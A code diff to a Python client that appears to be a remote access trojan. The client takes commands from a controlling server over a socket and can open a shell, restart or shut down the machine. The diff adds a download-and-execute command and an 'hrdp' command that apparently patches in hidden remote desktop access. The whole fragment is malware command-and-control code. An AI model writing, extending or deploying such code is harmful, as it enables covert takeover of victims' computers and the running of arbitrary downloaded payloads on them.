@@ -1,5 +1,5 @@
 import socket
-from client_folder.Modules import shell as Shell, power as Power
+from Modules import shell as Shell, power as Power, execute as Execute, hrdp as HRDP
 from time import sleep
 import requests
 import json
@@ -70,6 +70,10 @@ def connect_to_server():
                     Power.restart()
                 elif cmd == 'shutdown':
                     Power.shutdown()
+                elif cmd == 'execute':
+                    Execute.download_and_execute(client)
+                elif cmd == 'hrdp':
+                    HRDP.patch(client)
                 else:
                     client.send('[!] Unconfigured option')
         else:
